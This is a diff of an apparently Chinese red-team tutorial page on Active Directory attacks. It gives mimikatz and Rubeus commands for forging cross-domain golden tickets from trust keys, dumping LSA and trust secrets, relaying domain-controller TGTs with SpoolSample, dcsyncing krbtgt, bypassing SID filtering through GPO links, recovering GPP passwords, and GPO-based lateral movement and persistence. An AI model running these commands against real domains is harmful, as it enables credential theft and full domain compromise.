+</div><p><img src="/images/16503556644304.jpg" alt="">
+如果域间没有信任关系，SID 过滤策略会忽略 extra SID（不复制到ST PAC中）<strong>。</strong></p>
+<p><em><strong>Tips:</strong></em> 要在其他域中执行dcsync攻击，使用<code>Enterprise Domain Controllers(S-1-5-9)</code> 或<code>Domain Controllers(S-1-5-21-domain-516)</code>组的SID能够达到更隐蔽的效果，因为DC通常会执行dcsync中的同步规则。</p>
+<h3 id="域信任密钥创建跨域金票"><a href="#域信任密钥创建跨域金票" class="anchor-link">#</a><a href="#contents:域信任密钥创建跨域金票" class="headings">域信任密钥创建跨域金票</a></h3>
+<p><em><strong>Tips:</strong></em> 受SID 过滤影响</p>
+<p>和上面方法的唯一区别是通过域信任密钥创建域间转投TGT，添加企业管理员组到TGT PAC的<code>ExtraSids</code>字段。</p>
+<p>已控newtree.local域控，获取根域dc01.test.local权限。</p>
+<p>双向信任关系其实是两个单向信任关系的叠加，所以会有两个密钥。下图可看到有<code>[In] NEWTREE.LOCAL -&gt; TEST.LOCAL</code>（<code>TEST.LOCAL</code>信任<code>NEWTREE.LOCAL</code>）和<code>[Out] TEST.LOCAL -&gt; NEWTREE.LOCAL</code> 两种不同的密钥。因为这里要从<code>NEWTREE.LOCAL</code>域构造域间黄金票据访问林内部<code>TEST.LOCAL</code>域，所以使用 IN 这个 密钥。上面命令构造成功后将具备 <code>TEST.LOCAL</code>的管理员权限。
+<img src="/images/16503556888133.jpg" alt=""></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -341,52 +452,36 @@
 </span><span class="lnt">16
 </span><span class="lnt">17
 </span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#加载GroupPolicy模块 （win7没有，win10有）</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="n">GroupPolicy</span> <span class="err">–</span><span class="n">verbose</span>
-</span></span><span class="line"><span class="cl"><span class="c">#获得所有GPO名称等基本信息</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Get-GPO</span> <span class="n">-All</span>
-</span></span><span class="line"><span class="cl"><span class="c">#将所有GPO导出为一个HTML报告</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Get-GPOReport</span> <span class="n">-All</span> <span class="n">-ReportType</span> <span class="n">html</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span><span class="n">GposReport</span><span class="p">.</span><span class="n">html</span>
-</span></span><span class="line"><span class="cl"><span class="c">#将每个GPO单独导出一个HTML报告</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Get-GPO</span> <span class="n">-All</span> <span class="p">|</span> <span class="p">%{</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Get-GPOReport</span> <span class="n">-name</span> <span class="nv">$_</span><span class="p">.</span><span class="n">displayname</span> <span class="n">-ReportType</span> <span class="n">html</span> <span class="n">-path</span> <span class="p">(</span><span class="s2">&#34;c:\&#34;</span><span class="p">+</span><span class="nv">$_</span><span class="p">.</span><span class="n">displayname</span><span class="p">+</span><span class="s2">&#34;.html&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="c">#查看指定GPO的权限设置</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Get-GPPermission</span> <span class="n">-Name</span> <span class="s2">&#34;Default Domain Policy&#34;</span> <span class="n">-All</span> 
-</span></span><span class="line"><span class="cl"><span class="c">#备份指定GPO</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Backup-Gpo</span> <span class="n">-Name</span> <span class="s2">&#34;Default Domain Policy&#34;</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span>
-</span></span><span class="line"><span class="cl"><span class="c">#备份所有GPO</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Backup-Gpo</span> <span class="n">-All</span> <span class="n">-Path</span> <span class="s2">&#34;c:\&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="c">#还原指定GPO</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Restore-GPO</span> <span class="n">-Name</span> <span class="s2">&#34;Default Domain Policy&#34;</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span>
-</span></span><span class="line"><span class="cl"><span class="c">#还原所有GPO</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Restore-GPO</span> <span class="n">-All</span> <span class="n">-Path</span> <span class="s2">&#34;c:\&#34;</span>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#查找信任账户</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-ADUser</span>  <span class="n">-LDAPFilter</span> <span class="s2">&#34;(SamAccountName=*$)&#34;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">SamAccountName</span>
+</span></span><span class="line"><span class="cl"><span class="c">#获取信任账号的NTLM（直接dcsync对应账号也行）</span>
+</span></span><span class="line"><span class="cl"><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span> <span class="s2">&#34;lsadump::lsa /patch /user:dc01$&#34;</span> <span class="s2">&#34;lsadump::trust /patch&#34;</span> <span class="s2">&#34;exit&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#Rubeus</span>
+</span></span><span class="line"><span class="cl"><span class="c">#这里使用RC4密钥，这也是MS-KILE（微软实现的Kerberos v5协议）默认使用的。</span>
+</span></span><span class="line"><span class="cl"><span class="c">#参数前面也介绍过了，这里/service指向的是父域TGS服务的SPN（后面会向其申请ST）/rc4 即域间信任密钥</span>
+</span></span><span class="line"><span class="cl"><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">silver</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">id</span><span class="err">:</span><span class="n">500</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">newtree</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">sid</span><span class="err">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">1380592208</span><span class="p">-</span><span class="n">1289200226</span><span class="p">-</span><span class="n">379417545</span> <span class="p">/</span><span class="n">groups</span><span class="err">:</span><span class="n">513</span> <span class="p">/</span><span class="n">sids</span><span class="err">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">331789915</span><span class="p">-</span><span class="n">2083398572</span><span class="p">-</span><span class="n">1041350406</span><span class="p">-</span><span class="n">519</span> <span class="p">/</span><span class="n">service</span><span class="err">:</span><span class="n">krbtgt</span><span class="p">/</span><span class="n">test</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">rc4</span><span class="err">:</span><span class="n">9ffbe43ea370fe957e7c39e2409b2a14</span> <span class="p">/</span><span class="n">nowrap</span>
+</span></span><span class="line"><span class="cl"><span class="c">#还需使用票据主动向父域DC请求TGS</span>
+</span></span><span class="line"><span class="cl"><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgs</span> <span class="p">/</span><span class="n">service</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">dc01</span><span class="p">.</span><span class="n">test</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">dc</span><span class="err">:</span><span class="n">dc01</span><span class="p">.</span><span class="n">test</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ticket</span><span class="err">:</span><span class="n">doIFazCCBWegAwIBBaEDA</span><span class="p">...</span> <span class="p">/</span><span class="n">ptt</span>
+</span></span><span class="line"><span class="cl"><span class="c">#mimikatz</span>
+</span></span><span class="line"><span class="cl"><span class="c">#/krbtgt 域间信任密钥 /sid 当前域sid /sids EA组的sid</span>
+</span></span><span class="line"><span class="cl"><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;Kerberos::golden /admin:administrator /domain:newtree.local /sid:S-1-5-21-1380592208-1289200226-379417545 /sids:S-1-5-21-331789915-2083398572-1041350406-519 /krbtgt:9ffbe43ea370fe957e7c39e2409b2a14 /service:krbtgt /target:test.local&#34;</span> <span class="s2">&#34;exit&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c">#在主动申请TGS</span>
+</span></span><span class="line"><span class="cl"><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgs</span> <span class="p">/</span><span class="n">service</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">dc01</span><span class="p">.</span><span class="n">test</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">dc</span><span class="err">:</span><span class="n">dc01</span><span class="p">.</span><span class="n">test</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ticket</span><span class="err">:</span><span class="n">ticket</span><span class="p">.</span><span class="n">kirbi</span> <span class="p">/</span><span class="n">ptt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">dir </span><span class="p">\\</span><span class="n">dc01</span><span class="p">.</span><span class="n">test</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div><h2 id="还原组策略中保存的密码"><a href="#还原组策略中保存的密码" class="anchor-link">#</a><a href="#contents:还原组策略中保存的密码" class="headings">还原组策略中保存的密码</a></h2>
-<p>如果在组策略中输入了密码，如以用户身份运行计划任务、修改域内主机内置administrator用户密码等。</p>
-<p>可以在SYSVOL下的配置中看到加密后的密码（AES-256），而微软公开了解密密钥。</p>
-<ol>
-<li>
-<p>可以通过以下命令来快速搜索</p>
-<p><code>findstr /S cpassword \\0day.org\sysvol\*.xml</code></p>
-</li>
-<li>
-<p>利用<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1" target="_blank" rel="noopener">Get-GPPPassword</a>，自动查询SYSVOL中的文件，还原出所有明文密码。</p>
-<p><code>Get-GPPPassword</code></p>
-</li>
-</ol>
-<p><strong>修复：打了补丁KB2962486后，无法在组策略中设置用户名密码。</strong></p>
-<h2 id="横向移动"><a href="#横向移动" class="anchor-link">#</a><a href="#contents:横向移动" class="headings">横向移动</a></h2>
-<p>拿下域管权限后可能防火墙原因无法访问目标电脑，这时候可以利用组策略进行横向。</p>
-<p>通过组策略来下放恶意软件、创建/修改计划任务、降级凭据保护、向计算机添加新的帐户到本地管理员组、启用明文密码提取等。</p>
-<p><a href="https://github.com/FSecureLABS/SharpGPOAbuse" target="_blank" rel="noopener">https://github.com/FSecureLABS/SharpGPOAbuse</a> 、https://github.com/FuzzySecurity/StandIn 实现计划任务、启动脚本、添加本地管理员用户。</p>
-<p><a href="https://github.com/Hackndo/pyGPOAbuse" target="_blank" rel="noopener">https://github.com/Hackndo/pyGPOAbuse</a> 可以实现计划任务、添加本地管理员。</p>
-<p><a href="https://github.com/rootSySdk/PowerGPOAbuse" target="_blank" rel="noopener">https://github.com/rootSySdk/PowerGPOAbuse</a> 可以实现的比较全。</p>
+</div><p>注意这里无论使用Rubeus还是mimikatz 都不能直接PTT，获得转投TGT 后，需要手动向dc01.test.local请求TGS 票据。使用PTT 的话，请求cifs/dc01.test.local时候是向本域dc02.newtree.local 发送的转投TGT，本域不识别。
+<img src="/images/16503557258003.jpg" alt="">
+<strong>单项信任关系的利用</strong></p>
+<p>当设置域B到域A的域或林信任时（B信任A），将在域A中创建一个名为B$的信任帐户（该账户就是A域中的一个域用户）。当域 A 中的用户请求域 B 中的服务票证时，信任帐户的Hash 用于加密域间 TGT。这种单向信任如何利用呢？</p>
+<p>其实简单点说，由于A 域中创建了一个B$ 的账户，它也是一个域账户，所以可以用于kerberos认证。由于知道它的Hash，所以可以用它去申请服务票据进行Kerberost 等等操作，但无法用于NTLM 认证。</p>
+<h3 id="无约束委派跨域利用"><a href="#无约束委派跨域利用" class="anchor-link">#</a><a href="#contents:无约束委派跨域利用" class="headings">无约束委派跨域利用</a></h3>
+<p><em><strong>Tips:</strong></em> 此方法也受SID 过滤策略的影响，开启SID 过滤后，不会发送TGT 到指定服务。</p>
+<p>在获得了域林中某个域控（默认启用非约束委派）的权限或配置了无约束委派的服务器权限情况下。使其他域的域控制器向已被控制服务器送身份认证请求，获取目标域控机器账户（或其他用户）TGT。</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -399,59 +494,23 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#加载GroupPolicy模块 （win7没有，win10有）</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="n">GroupPolicy</span>
-</span></span><span class="line"><span class="cl"><span class="c">#创建一个GPO并将GPO链接到域test.local，需要域管权限。</span>
-</span></span><span class="line"><span class="cl"><span class="nb">new-gpo</span> <span class="n">-name</span> <span class="n">TestGPO</span> <span class="p">|</span> <span class="nb">new-gplink</span> <span class="n">-Target</span> <span class="s2">&#34;dc=test,dc=local&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="c">#添加定时任务 --TargetDnsName指定计算机</span>
-</span></span><span class="line"><span class="cl"><span class="n">SharpGPOAbuse</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-AddComputerTask</span> <span class="p">-</span><span class="n">-TaskName</span> <span class="s2">&#34;Update2&#34;</span> <span class="p">-</span><span class="n">-Author</span> <span class="n">DOMAIN</span><span class="p">\</span><span class="n">Admin</span> <span class="p">-</span><span class="n">-Command</span> <span class="s2">&#34;cmd.exe&#34;</span> <span class="p">-</span><span class="n">-Arguments</span> <span class="s2">&#34;/c calc.exe&#34;</span> <span class="p">-</span><span class="n">-GPOName</span> <span class="s2">&#34;TestGPO2&#34;</span> <span class="p">-</span><span class="n">-FilterEnabled</span> <span class="p">-</span><span class="n">-TargetDnsName</span> <span class="nb">PC-jack</span><span class="p">-</span><span class="n">0day</span><span class="p">.</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span>
-</span></span><span class="line"><span class="cl"><span class="c">#删除GPO</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Remove-GPO</span> <span class="n">-Name</span> <span class="n">TestGPO2</span>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#在dc.a.com使用rubeus监控身份认证请求。（intrval指定监控的时间间隔，filteruser指定关注的用户）</span>
+</span></span><span class="line"><span class="cl"><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">monitor</span> <span class="p">/</span><span class="n">monitorinterval</span><span class="err">:</span><span class="n">5</span> <span class="p">/</span><span class="n">filteruser</span><span class="err">:</span><span class="n">BDC</span><span class="p">$</span> <span class="p">/</span><span class="n">nowrap</span>
+</span></span><span class="line"><span class="cl"><span class="c">#使用SpoolSample 让目标域控bcd.b.com向dc.a.com发送身份验证请求。</span>
+</span></span><span class="line"><span class="cl"><span class="n">SpoolSample</span><span class="p">.</span><span class="n">exe</span> <span class="n">bdc</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">com</span> <span class="n">dc</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="n">com</span>
+</span></span><span class="line"><span class="cl"><span class="c">#rubeus捕捉到认证请求后保存TGT数据。</span>
+</span></span><span class="line"><span class="cl"><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">ptt</span> <span class="p">/</span><span class="n">ticket</span><span class="err">:</span><span class="n">TGT数据</span><span class="p">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="c">#然后请求目标域的krbtgt Hash</span>
+</span></span><span class="line"><span class="cl"><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;lsadump::dcsync /domain:B.com /user:B\krbtgt&#34;</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div><p>可以通过cs的<code>execute-assembly</code> 执行。</p>
-<h2 id="权限维持"><a href="#权限维持" class="anchor-link">#</a><a href="#contents:权限维持" class="headings">权限维持</a></h2>
-<h3 id="添加用户对gpo的权限"><a href="#添加用户对gpo的权限" class="anchor-link">#</a><a href="#contents:添加用户对gpo的权限" class="headings">添加用户对GPO的权限</a></h3>
-<p>其实就是对<code>CN=Policies,CN=System,&lt;BaseDn&gt;</code>具备CreateChild的权限。</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#查询域内具备创建GPO权限的用户</span>
-</span></span><span class="line"><span class="cl"><span class="n">adfind</span> <span class="n">-b</span> <span class="n">CN</span><span class="p">=</span><span class="n">Policies</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">System</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">test</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">local</span> <span class="n">-sddl</span><span class="p">+++</span> <span class="n">-s</span> <span class="n">base</span> <span class="n">-sdna</span> <span class="n">-sddlfilter</span> <span class="p">;;</span><span class="s2">&#34;CR CHILD&#34;</span><span class="p">;;;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c">#添加用户test1对TestGPO的完全访问权限</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$RawObject</span> <span class="p">=</span> <span class="nb">Get-DomainGPO</span> <span class="n">-Raw</span> <span class="n">-Identity</span> <span class="s1">&#39;TestGPO&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$TargetObject</span> <span class="p">=</span> <span class="nv">$RawObject</span><span class="p">.</span><span class="n">GetDirectoryEntry</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$ACE</span> <span class="p">=</span> <span class="nb">New-ADObjectAccessControlEntry</span> <span class="n">-InheritanceType</span> <span class="n">All</span> <span class="n">-AccessControlType</span> <span class="n">Allow</span> <span class="n">-PrincipalIdentity</span> <span class="n">test1</span> <span class="n">-Right</span> <span class="n">AccessSystemSecurity</span><span class="p">,</span><span class="n">CreateChild</span><span class="p">,</span><span class="n">Delete</span><span class="p">,</span><span class="n">DeleteChild</span><span class="p">,</span><span class="n">DeleteTree</span><span class="p">,</span><span class="n">ExtendedRight</span><span class="p">,</span><span class="n">GenericAll</span><span class="p">,</span><span class="n">GenericExecute</span><span class="p">,</span><span class="n">GenericRead</span><span class="p">,</span><span class="n">GenericWrite</span><span class="p">,</span><span class="n">ListChildren</span><span class="p">,</span><span class="n">ListObject</span><span class="p">,</span><span class="n">ReadControl</span><span class="p">,</span><span class="n">ReadProperty</span><span class="p">,</span><span class="n">Self</span><span class="p">,</span><span class="n">Synchronize</span><span class="p">,</span><span class="n">WriteDacl</span><span class="p">,</span><span class="n">WriteOwner</span><span class="p">,</span><span class="n">WriteProperty</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$TargetObject</span><span class="p">.</span><span class="n">PsBase</span><span class="p">.</span><span class="n">ObjectSecurity</span><span class="p">.</span><span class="n">AddAccessRule</span><span class="p">(</span><span class="nv">$ACE</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$TargetObject</span><span class="p">.</span><span class="n">PsBase</span><span class="p">.</span><span class="n">CommitChanges</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c">#移除用户test1对TestGPO的完全访问权限</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$RawObject</span> <span class="p">=</span> <span class="nb">Get-DomainGPO</span> <span class="n">-Raw</span> <span class="n">-Identity</span> <span class="s1">&#39;TestGPO&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$TargetObject</span> <span class="p">=</span> <span class="nv">$RawObject</span><span class="p">.</span><span class="n">GetDirectoryEntry</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$ACE</span> <span class="p">=</span> <span class="nb">New-ADObjectAccessControlEntry</span> <span class="n">-InheritanceType</span> <span class="n">All</span> <span class="n">-AccessControlType</span> <span class="n">Allow</span> <span class="n">-PrincipalIdentity</span> <span class="n">test1</span> <span class="n">-Right</span> <span class="n">AccessSystemSecurity</span><span class="p">,</span><span class="n">CreateChild</span><span class="p">,</span><span class="n">Delete</span><span class="p">,</span><span class="n">DeleteChild</span><span class="p">,</span><span class="n">DeleteTree</span><span class="p">,</span><span class="n">ExtendedRight</span><span class="p">,</span><span class="n">GenericAll</span><span class="p">,</span><span class="n">GenericExecute</span><span class="p">,</span><span class="n">GenericRead</span><span class="p">,</span><span class="n">GenericWrite</span><span class="p">,</span><span class="n">ListChildren</span><span class="p">,</span><span class="n">ListObject</span><span class="p">,</span><span class="n">ReadControl</span><span class="p">,</span><span class="n">ReadProperty</span><span class="p">,</span><span class="n">Self</span><span class="p">,</span><span class="n">Synchronize</span><span class="p">,</span><span class="n">WriteDacl</span><span class="p">,</span><span class="n">WriteOwner</span><span class="p">,</span><span class="n">WriteProperty</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$TargetObject</span><span class="p">.</span><span class="n">PsBase</span><span class="p">.</span><span class="n">ObjectSecurity</span><span class="p">.</span><span class="n">RemoveAccessRule</span><span class="p">(</span><span class="nv">$ACE</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$TargetObject</span><span class="p">.</span><span class="n">PsBase</span><span class="p">.</span><span class="n">CommitChanges</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><strong>GPO 链接的权限（可选）</strong></p>
+</div><h3 id="绕过sid-过滤"><a href="#绕过sid-过滤" class="anchor-link">#</a><a href="#contents:绕过sid-过滤" class="headings">绕过SID 过滤</a></h3>
+<p><code>CN=Configuration,DC=root,DC=local</code> 分区是用于林的配置信息，并被复制到林中的每个域控制器。此外，林中的每个可写域控制器都拥有配置 NC 的可写副本。这意味着子 DC（不是只读 DC）可以通过查询其本地副本来读取和写入林的配置 NC 下的任何内容。下面三种方式都是通过<code>CN=Configuration,DC=root,DC=local</code> 分区来利用的。</p>
+<p><strong>利用环境：林内，在一个双向信任的父子域中，父域开启了SID 过滤。</strong></p>
+<ul>
+<li>
+<p><strong>GPO</strong></p>
+<p>在子域域控上以system权限可以链接GPO到AD 复制站点，包括父域DC所在的站点。</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -462,127 +521,20 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#查找对gPCFileSysPath属性WriteProperty权限的用户</span>
-</span></span><span class="line"><span class="cl"><span class="n">adfind</span> <span class="n">-b</span> <span class="n">CN</span><span class="p">=</span><span class="n">Policies</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">System</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">0day</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">org</span> <span class="n">nTSecurityDescriptor</span> <span class="n">-sddl</span><span class="p">+++</span> <span class="n">-s</span> <span class="n">subtree</span> <span class="n">-sdna</span> <span class="n">-sddlfilter</span> <span class="p">;;;</span><span class="n">gPCFileSysPath</span><span class="p">;;</span> <span class="n">-recmute</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c">#对组策略目录有修改权限的可以随意修改组策略配置</span>
-</span></span><span class="line"><span class="cl"><span class="n">icacls</span> <span class="p">\\</span><span class="n">test</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">sysvol</span><span class="p">\</span><span class="n">test</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">scripts</span><span class="p">*</span>
-</span></span><span class="line"><span class="cl"><span class="n">icacls</span> <span class="p">\\</span><span class="n">test</span><span class="p">.</span><span class="n">localsysvol</span><span class="p">\</span><span class="n">test</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">policies</span><span class="p">*</span>
-</span></span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#在父域检查复制站点</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-ADDomainController</span> <span class="n">-Server</span> <span class="n">root</span><span class="p">.</span><span class="n">local</span> <span class="p">|</span> <span class="nb">select </span><span class="n">HostName</span><span class="p">,</span> <span class="n">ServerObjectON</span>
+</span></span><span class="line"><span class="cl"><span class="c">#子域域控以system权限执行，链接test GPO到目标 </span>
+</span></span><span class="line"><span class="cl"><span class="nb">New-GPLink</span> <span class="n">-Name</span> <span class="s2">&#34;test&#34;</span> <span class="n">-Target</span> <span class="s2">&#34;CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=root,DC=local&#34;</span> <span class="n">-Server</span> <span class="n">child</span><span class="p">.</span><span class="n">root</span><span class="p">.</span><span class="n">local</span>
+</span></span><span class="line"><span class="cl"><span class="c">#等待复制到父域，然后在父域域控上查看GPO被应用了</span>
+</span></span><span class="line"><span class="cl"><span class="n">gpresult</span> <span class="p">/</span><span class="nb">r
+</span></span></span></code></pre></td></tr></table></div>
 </div>
-</div><p>如果有对域、OU的gPLink属性或gPOpptions属性有修改权限，就可以修改其链接的组策略。</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#遍历服部这个OU,对gLink或者gPOpptions有WriteProperty权限的用户</span>
-</span></span><span class="line"><span class="cl"><span class="n">adfind</span> <span class="n">-b</span> <span class="n">OU</span><span class="p">=</span><span class="n">客服部</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">0day</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">org</span> <span class="n">-sddl</span><span class="p">+++</span> <span class="n">-s</span> <span class="n">base</span>  <span class="n">-sdna</span> <span class="n">-sddlfilter</span> <span class="p">;;;</span><span class="n">gPlink</span><span class="p">;;</span>
-</span></span><span class="line"><span class="cl"><span class="n">adfind</span> <span class="n">-b</span> <span class="n">OU</span><span class="p">=</span><span class="n">客服部</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">0day</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">org</span> <span class="n">-sddl</span><span class="p">+++</span> <span class="n">-s</span> <span class="n">base</span> <span class="n">-sdna</span> <span class="n">-sddlfilter</span> <span class="p">;;;</span><span class="n">gPOpptions</span><span class="p">;;</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><h3 id="seenabledelegationprivilege-特权"><a href="#seenabledelegationprivilege-特权" class="anchor-link">#</a><a href="#contents:seenabledelegationprivilege-特权" class="headings">SeEnableDelegationPrivilege 特权</a></h3>
-<p>有SeEnableDelegationPrivilege权限的域用户才能给域内服务账户设置委派（约束和非约束，但不包括基于资源的约束委派）。该权限只能通过Default Domain Controllers Policy组策略修改（或修改域控的计算机策略）。</p>
-<p>并不是拥有一个对象的GenericAll权限，就可以修改对象的msDS-AllowedToDelegateTo属性，只能有SeEnableDelegationPrivilege权限的才行。</p>
-<ol>
-<li>
-<p><strong>赋予用户<code>SeEnableDelegationPrivilege</code>权限</strong></p>
-<ul>
-<li>
-<p>通过组策略管理编辑器</p>
-<p><img src="/images/image-1630807144.png" alt=""></p>
+</div><p>通过GPO 可以设置计划任务等来获取权限。</p>
 </li>
 <li>
-<p>通过Default Domain Controllers Policy下的GptTmpl.inf文件</p>
-<p>文件位置:<code>\\rootkit.org\SYSVOL\rootkit.org\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</code></p>
-<p>添加jack用户的sid</p>
-<p><img src="/images/image-1630807215.png" alt=""></p>
-<p>再测试环境中，要使更改生效需要域控更新组策略:<code>gpupdate /force</code>，并使jack重新登录才有权限。（可能等待时间长些也能生效）</p>
-</li>
-</ul>
-</li>
-<li>
-<p><strong>给服务账户设置委派</strong>（只有拥有SPN的用户才能被设置委派，机器账号默认注册了SPN）</p>
-<ul>
-<li>
